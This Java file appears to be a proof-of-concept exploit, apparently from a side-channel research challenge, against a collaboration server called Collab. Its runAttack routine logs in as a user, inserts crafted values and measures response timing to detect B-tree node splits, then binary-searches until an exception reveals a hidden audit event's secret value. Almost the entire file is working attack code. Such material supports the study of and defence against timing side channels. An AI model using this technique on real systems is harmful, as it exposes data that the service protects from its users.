/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package collab.proof;

import client.support.CollabConnException;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;

/**
 *
 * @author user
 */
public class Proof {

    //MAX Size of the node
    private static int NodeMaxSize;

    public static ProofClientWrapper client;
    public static List<Integer> reverseDirVals;
    public static List<DataEntry> dataItems;
    public static List<DataNode> dataNodes;
    private static int LeftNodeBalancedSize;
    private static DataNode leftnode;
    private static DataNode rightnode;
    private static int intervalleft;
    private static int intervalright;
    private static long PREDETERMINED_TIMING_THRESHOLD = 1000000;
    
    //private static int  addignorenum = 3;

    public static void main(String[] args) throws FileNotFoundException, CollabConnException, IOException {

        client = new ProofClientWrapper();

        runAttack();
    }

    public static int[] allpublicvals;

    public static int search(List l, Comparable i) {

        Iterator it = l.iterator();
        int index = 0;
        while (it.hasNext()) {
            Comparable next = (Comparable) it.next();
            int res = next.compareTo(i);
            if (res == 0) {
                return index;
            }

            index++;
        }

        return -1;
    }

    private static int[] getAllPublicValues(ProofClientWrapper client) throws CollabConnException {
        int[] doSearchID = client.doSearchID(null, 0, 30000000);
        return doSearchID;
    }

    enum entryType {

        PUBLIC,
        DECREMENT,
        INCREMENT,
        NONE;
    }

    public static class NodeSplitObject {

        DataNode left;
        DataNode right;
        List<DataEntry> addedEntry;
        private int splitCnt;

        public NodeSplitObject(DataNode dnl, DataNode dnr) {
            left = dnl;
            right = dnr;

            addedEntry = new ArrayList<DataEntry>();
        }

        private NodeSplitObject(DataNode n) {
            left = n;

            addedEntry = new ArrayList<DataEntry>();
        }

        public void processSplit(int splitCnt) {
        }

        public int getInitialValToAdd(int offset) {
            return left.vals.get(LeftNodeBalancedSize - 1 + offset).val;
        }

        public int getInitialValToAdd() {
            return left.vals.get(LeftNodeBalancedSize - 1).val;
        }

        public int getLocationOfDecider() {
            return LeftNodeBalancedSize;
        }

        private void addItem(DataEntry dataEntry) {
            addedEntry.add(dataEntry);
            DataEntry.addToList(dataEntry);
        }

    }

    public static class DataNode implements Comparable<DataNode> {

        public List<DataEntry> vals;
        public boolean containsSecret;

        public DataNode() {
            vals = new ArrayList<DataEntry>(NodeMaxSize);//new DataEntry[NodeMaxSize];
            for (int i = 0; i < NodeMaxSize; i++) {
                vals.add(new DataEntry());
            }
            //Arrays.fill(vals, null);
        }

        public void setItem(int index, DataEntry e) {
            vals.set(index, e);
        }

        public void setItem(DataEntry e) {
            vals.add(e);
            Collections.sort(vals, Collections.reverseOrder());
        }

        public static void replaceItem(DataNode orig, DataNode new1, DataNode new2) {
            int itemind = search(dataNodes, orig);
            if (itemind > 0) {
                DataNode nodeout = dataNodes.get(itemind);
                dataNodes.remove(nodeout);
                dataNodes.add(new1);
                dataNodes.add(new2);
                Collections.sort(dataNodes, Collections.reverseOrder());

            } else {

                System.exit(1);
            }
        }

        public static DataNode getNextNode(DataNode node) {
            int itemind = search(dataNodes, node);
            if (itemind >= 0) {
                DataNode nodeout = dataNodes.get(itemind + 1);
                return nodeout;

            }
            return null;
        }

        public static DataNode getPrevNode(DataNode node) {
            int itemind = search(dataNodes, node);
            if (itemind > 0) {
                DataNode nodeout = dataNodes.get(itemind - 1);
                return nodeout;

            }
            return null;
        }

        @Override
        public int compareTo(DataNode o) {

            return o.vals.get(0).val - vals.get(0).val;
        }

        public static void addToList(DataNode dn) {
            if (dataNodes == null) {
                dataNodes = new ArrayList<DataNode>();
            }
            dataNodes.add(dn);
            Collections.sort(dataNodes, Collections.reverseOrder());
        }

        private void addEntry(DataEntry de) {
            //vals.add(de);
            for (int i = 0; i < vals.size(); i++) {
                DataEntry get = vals.get(i);
                if (get.val == DataEntry.MAX) {
                    vals.set(i, de);
                    break;
                }
            }
            Collections.sort(vals, Collections.reverseOrder());
        }

        private DataEntry getEntry(int index) {
            return vals.get(index);

        }

        private void removeEntryreplaceEmpty(int index) {
            vals.remove(index);
            vals.add(new DataEntry());
            Collections.sort(vals, Collections.reverseOrder());
        }

        private void removeEntry(int index) {
            vals.remove(index);
        }

        public static void printtoDot(String step) throws FileNotFoundException {
            PrintWriter dotout = new PrintWriter("pseudo" + step + ".dot");
            dotout.println("digraph Nodes {");

            dotout.print("node [shape=box]; ");
            dotout.print("0 [label=\"root\"];\n");

            int x = 1;
            String conns = "";
            Iterator<DataNode> it = dataNodes.iterator();
            while (it.hasNext()) {
                DataNode node = it.next();
                Iterator<DataEntry> itx = node.vals.iterator();
                String vals = "";

                while (itx.hasNext()) {
                    String p = "-1";
                    DataEntry next = itx.next();
                    if (next.val < DataEntry.MAX) {
                        p = (next.val + "(" + next.type.toString().charAt(0) + ")" + " :");
                    } //p = (next.val + " :");
                    else {
                        p = ("x :");
                    }
                    vals += p;
                }

                dotout.print(x + "[label=\"" + vals + "\"];\n");
                conns += "0 ->" + x + "\n";
                x++;

            }
            dotout.println("");
            dotout.println(conns);

            dotout.println("");

            dotout.println("}");
            dotout.flush();
            dotout.close();

        }
    }

    public static class DataEntry implements Comparable<DataEntry> {

        int val;
        entryType type;

        public static int MAX = 2147483647;

        public DataEntry() {
            this(MAX, entryType.NONE);
        }

        public DataEntry(int v) {
            this(v, entryType.NONE);
        }

        public DataEntry(int v, entryType t) {
            setItem(v, t);
        }

        public void setItem(int v, entryType t) {
            val = v;
            type = t;
        }

        @Override
        public int compareTo(DataEntry o) {

            return o.val - val;
        }

        public static entryType getType(int v, entryType t) {

            DataEntry get = DataEntry.get(v);
            if (get != null) {
                return get.type;
            }
            return entryType.NONE;
        }

        public static DataEntry get(int v) {

            int id = search(dataItems, new DataEntry(v));
            if (id >= 0) {
                return dataItems.get(id);
            }
            return null;

        }

        public static void addToList(int[] v, entryType t) {
            for (int i = 0; i < v.length; i++) {
                addToList(v[i], t);
            }
        }

        public static void addToList(DataEntry de) {

            if (dataItems == null) {
                dataItems = new ArrayList<DataEntry>();
            }
            dataItems.add(de);
            Collections.sort(dataItems, Collections.reverseOrder());
        }

        public static void addToList(int v, entryType t) {
            DataEntry de = new DataEntry(v, t);
            addToList(de);
        }

        public static void initializeToNodes(int sizeofjustsplitleftnode) {
            for (int i = 0; i < dataItems.size(); i += sizeofjustsplitleftnode) {
                DataNode node = null;
                for (int j = 0; j < sizeofjustsplitleftnode; j++) {
                    if (i + j >= dataItems.size()) {
                        break;
                    }
                    if (j == 0) {
                        node = new DataNode();
                    }
                    node.setItem(j, dataItems.get(i + j));
                }
                if (node != null) {
                    DataNode.addToList(node);
                }
            }

        }
    }

    //THIS IS THE FUNCTION THAT DRIVES THE ATTACK
    public static void runAttack() throws FileNotFoundException, CollabConnException, IOException {

        NodeMaxSize = 9;
        LeftNodeBalancedSize = NodeMaxSize / 2 + NodeMaxSize % 2;

        //STAC: ATTACK STEP 1: 
        client.login("picard");
        client.initSandbox();

        //STEP 1 CONTINUED: GET ALL THE PUBLIC VALUES FORM THE SANDBOX
        allpublicvals = getAllPublicValues(client);
        DataEntry.addToList(allpublicvals, entryType.PUBLIC);
        DataEntry.initializeToNodes(LeftNodeBalancedSize);

        int attempts = 0;

        System.out.println("total operations after step 1:" + client.ops);
        //STEP 2: DETERMINE IN WHICH NODE THE HIDDEN AUDITING EVENT IS RECORDED
        //Should not reach dataNodes.size() unless no auditor event is present
        while (attempts < dataNodes.size()) {

            //Get the id value to insert in order to begin testing a node in the remote tree
            DataNode insert_ID = dataNodes.get(attempts);
            NodeSplitObject splitstate = new NodeSplitObject(insert_ID);
            int splitCnt = addUntilSplit(splitstate);

            int expected_num_of_empties = (NodeMaxSize - LeftNodeBalancedSize);
            if (splitCnt < expected_num_of_empties) {
                //We found the node containing the secret audit node
                System.out.println("Found ");
                splitNode(splitstate, true);
                break;
            }
            attempts++;
        }
        System.out.println("Total operations after step 2:" + client.ops);
        System.out.println("Note: Step 2 is skipped in optimized version of proof script");

        //STEP 3: DISCARD THE SANDBOX, AND REINITIATE
        System.out.println("Total operations after step 3:" + client.ops);

        //STEP 4: DETERMINE THE BOOKENDS (INTERVAL)
        List<Integer> splitPublicValsInHalf = null;
        int positionstartadding = 0;
        int iter = 1;
        int lastvaladded = 0;
        while (splitPublicValsInHalf == null || splitPublicValsInHalf.size() > 2) {
            NodeSplitObject splitstate = new NodeSplitObject(leftnode, rightnode);

            System.out.println("positionstartadding:"+positionstartadding);
            int splitCnt = addUntilSplit(splitstate, positionstartadding);

            System.out.println("" + (positionstartadding + (splitCnt - 1)) + " -- " + lastvaladded);
            System.out.println("--splitCnt:" + splitCnt);
            if (splitCnt == (NodeMaxSize - LeftNodeBalancedSize)) {
                System.out.println("" + (positionstartadding + (splitCnt - 1)) + " -- " + lastvaladded);
                intervalleft = (positionstartadding + (splitCnt - 1));
                intervalright = lastvaladded;

                break;

            } else if (splitCnt == (NodeMaxSize - LeftNodeBalancedSize) + 1) {
                int initialValToAdd = 0;
                splitstate.getInitialValToAdd(0);
                if (iter == 1) {
                    initialValToAdd = splitstate.getInitialValToAdd(0);
                } else {
                    DataEntry v = splitstate.left.vals.get(LeftNodeBalancedSize - iter);
                    initialValToAdd = v.val;

                }
                int positionofnextcandidate = LeftNodeBalancedSize - iter;

                DataEntry v = splitstate.left.vals.get(positionofnextcandidate - 1);

                int ii = 0;
                for (int a = positionofnextcandidate; a < LeftNodeBalancedSize; a++) {

                    ii++;
                    client.add(null, v.val + (ii));
                    splitstate.addItem(new DataEntry(v.val + (ii), entryType.INCREMENT));

                    positionstartadding = (v.val + (ii)) + 1;
                }
                int d = 1;
                lastvaladded = initialValToAdd;
                for (int a = ii; a < LeftNodeBalancedSize - 1; a++) {

                    client.add(null, initialValToAdd - (d));
                    splitstate.addItem(new DataEntry(initialValToAdd - (d), entryType.DECREMENT));

                    lastvaladded = (initialValToAdd - (d));
                    d++;
                }
                iter++;
            }
        }

        System.out.println("total operations after step 4:" + client.ops);

        //STEP 5: PERFORM BINARY SEARCH ON INTERVAL
        int loops = 0;
        System.out.println("-----------------------------");
        int intervalsize = intervalright - intervalleft;
        int maxnumtries = 31 - Integer.numberOfLeadingZeros(intervalsize);
        try {
            while (loops < maxnumtries && intervalsize > NodeMaxSize) {

                System.out.println("interval to test: [" + intervalleft + "," + intervalright + "]");
                int mid = (intervalright - intervalleft) / 2;
                System.out.println("midpoint to add: " + (intervalleft + mid));
                client.add(null, intervalleft + mid);

                int splitCnt = addUntilSplit(intervalleft);
                System.out.println("splitCnt: " + splitCnt);
                if (splitCnt == (NodeMaxSize - LeftNodeBalancedSize)) {
                    intervalleft = (intervalleft + mid) + 1;
                } else if (splitCnt == (NodeMaxSize - LeftNodeBalancedSize) + 1) {
                    int temp = intervalleft;
                    intervalleft = lastvaladdedduringsearch + 1;
                    intervalright = temp + mid - 1;
                }
                loops++;
                System.out.println("-----------------------------iterations:" + loops);
                intervalsize = intervalright - intervalleft;
            }
            System.out.println("interval too small to test: [" + intervalleft + "," + intervalright + "]");

            addUntilException(intervalleft, NodeMaxSize);
        } catch (CollabConnException ce) {
            System.out.println("FOUND IT!");
        }
        System.out.println("total operations after step 5:" + client.ops);

    }

    public static int addUntilSplit(NodeSplitObject nodeState) throws CollabConnException {

        DataNode nextNode = DataNode.getNextNode(nodeState.left);

        int initialValToAdd = nextNode.vals.get(0).val;
        boolean issplit = false;
        int cnt = 0;
        int i=0;
        while (!issplit ){//|| i<addignorenum) {
            initialValToAdd -= 1;
            if (DataEntry.get(initialValToAdd) == null) {
                System.out.println("val to add:" + initialValToAdd);
                client.add(null, initialValToAdd);
           if (client.client.client.lasttiming > PREDETERMINED_TIMING_THRESHOLD) {
                issplit = true;
            }
                //System.out.println("isslpit:" + isslpit);
                cnt++;
            }

           i++;
        }
        return cnt;
    }

    public static int addUntilSplit(NodeSplitObject nodeState, int positionstartadding) throws CollabConnException {
        int initialValToAdd = positionstartadding;
        if (positionstartadding == 0) {
            initialValToAdd = nodeState.getInitialValToAdd(0);
        }
        boolean issplit = false;
        int cnt = 0;
        int i=0;
        while (!issplit){ //|| i<addignorenum) {
            //System.out.println("initialValToAdd:" + initialValToAdd);
            if (DataEntry.get(initialValToAdd) == null) {
                System.out.println("val to add:" + initialValToAdd);
                 client.add(null, initialValToAdd);
                nodeState.addItem(new DataEntry(initialValToAdd, entryType.INCREMENT));

                //System.out.println("isslpit:" + isslpit);
                cnt++;
                nodeState.splitCnt = cnt;
                if (client.client.client.lasttiming > PREDETERMINED_TIMING_THRESHOLD) {
                    issplit = true;
                }
            }

            initialValToAdd++;
            i++;
        }
        System.out.println("cntx:" + cnt);
        return cnt;
    }

    static int lastvaladdedduringsearch = 0;

    public static int addUntilSplit(int initialValToAdd) throws CollabConnException {

        int cnt = 0;
        if (client.client.client.lasttiming > 750000) {
            if (client.client.client.lastsplit == false) {
                System.out.println("isslpit did not match" + client.client.client.lasttiming);
            }
        }
        boolean issplit = false;

        int i=0;
        while (!issplit ){//|| i<addignorenum) {|| i<addignorenum) {
            if (DataEntry.get(initialValToAdd) == null) {
                System.out.println("val to add:" + initialValToAdd);
                lastvaladdedduringsearch = initialValToAdd;
                client.add(null, initialValToAdd);

                //System.out.println("isslpit:" + client.client.client.lastsplit);
                cnt++;
                
             if (client.client.client.lasttiming > PREDETERMINED_TIMING_THRESHOLD) {
                issplit = true;
            }
            }


            //issplit = client.client.client.lastsplit;
            initialValToAdd++;
            i++;
        }
        return cnt;
    }

    public static void addUntilException(int initialValToAdd, int maxtries) throws CollabConnException {

        for (int i = 0; i < maxtries; i++) {

            try {
                System.out.println("val to add:" + (initialValToAdd + i));
                client.add(null, initialValToAdd + i);
            } catch (CollabConnException ce) {
                System.out.println("The secret:" + (initialValToAdd + i));
                throw new CollabConnException();
            }
            maxtries++;
        }

    }

    public static void splitNode(NodeSplitObject splitstate, boolean splitLeft) {
        DataNode tosplit = null;
        //The left node that split-- secret is on the right 
        if (splitLeft) {
            tosplit = splitstate.left;
        }
        if (!splitLeft) {
            tosplit = splitstate.right;
        }

        Iterator<DataEntry> it = splitstate.addedEntry.iterator();
        while (it.hasNext()) {
            tosplit.addEntry(it.next());
        }
        DataNode ndnewl = new DataNode();
        for (int i = 0; i < splitstate.getLocationOfDecider(); i++) {
            DataEntry de = tosplit.vals.get(i);
            ndnewl.addEntry(de);
        }
        DataNode ndnewr = new DataNode();
        for (int i = splitstate.getLocationOfDecider(); i < splitstate.left.vals.size(); i++) {
            DataEntry de = tosplit.vals.get(i);
            ndnewr.addEntry(de);
        }

        DataNode.replaceItem(tosplit, ndnewl, ndnewr);
        if (leftnode == null || rightnode == null) {
            leftnode = ndnewl;
            rightnode = ndnewr;
        } else {
            if (splitLeft) {
                //leftnode = ndnewr;
                leftnode = ndnewl;//splitstate.right;
                rightnode = ndnewr;//DataNode.getNextNode(splitstate.right);
            }
            if (!splitLeft) {
                leftnode = splitstate.left;
                rightnode = ndnewl;
            }
        }
    }

}
